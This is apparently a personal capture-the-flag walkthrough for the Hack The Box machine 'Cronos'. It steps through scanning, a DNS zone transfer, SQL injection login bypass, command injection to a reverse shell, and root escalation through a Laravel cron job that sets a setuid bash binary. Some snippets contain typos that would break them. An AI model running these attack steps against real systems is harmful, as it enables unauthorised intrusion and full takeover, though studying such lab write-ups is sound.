nmap -sC -sV 10.10.10.13

port 22,53 & 80 are open:

go to the web page : http://10.10.10.13 > sees a deafult apache ubuntu page ---> meaning: we dont going the right route or there some misconfiguration
solution:
---------
intercept with burp & change the 'host' in the req to the boxes hostname----> host: cronos.htb
to find hostname :
we seen there is a DNS 53 port---> run nslookup
> nslookup
>server 10.10.10.13
>10.10.10.13

**if doesnt work --> run gobuster aginst the ip address

all the links in the web page are out of scope

edit etc/hosts file ---> 10.10.10.13 	cronos.htb

run dirbuster  -- disable recursive

we seen there is a DNS 53 port---> run nslookup
> nslookup
>server 10.10.10.13
>10.10.10.13

try a zoneTransfer----> dig axfr @10.10.10.13 cronos.htb
in the result we see more subdomains
edit the etc/hosts file & add the subdomains----> 10.10.10.13 <add domaine names here>

go to : admin.crons.htb
sees a login page ---> try to sqlmap it : sqlmap -r login.req
**got a rediraction massage to w web page it means something good happend. countine the sqlmap and see it happen in the username parameter so at the same time try manualy:
submit new req in username: admin'-- -

redirected to a new page with a command injection vuln > 
google 'pentestmonket reverse shell cheatsheet'
try to inject reverse shell command---> try differnt one till work
GET A SHELL

get a real shell: python -c 'import pty;pty.spawn("/bin/bash");'

GOT U S E R !

===========================

PE:
---

transfer & run privEsc scripts: LinEnum.sh linuxprivchecker.py uniprivesc.sh 

in LinEnum we see in the 'Crontab contests' there is a schedule cron job runs with root privs
search google: ' laravel create schedule commands':
find & edit the app/Console/Kernel.php file
>find / -name Kernel.php
got to protected function schedule and add:
$schedule->exec('touch /tmp/katomi')->>everyMinute();

on host create setuid.c file:
int main(void)
{
	setuid(0);
	setgid(0);
	system('/bin/bas');
}

compile ---> gcc setuid.c -o katomi
transfer to victim
make it executable 
edit Kernel.php
got to protected function schedule and add:
$schedule->exec('chown root:root /tmp<here is the path>/katomi; chmod 4755 /tmp/katomi')->>everyMinute();
 run>./katomi
run> id

GOR R O O T !
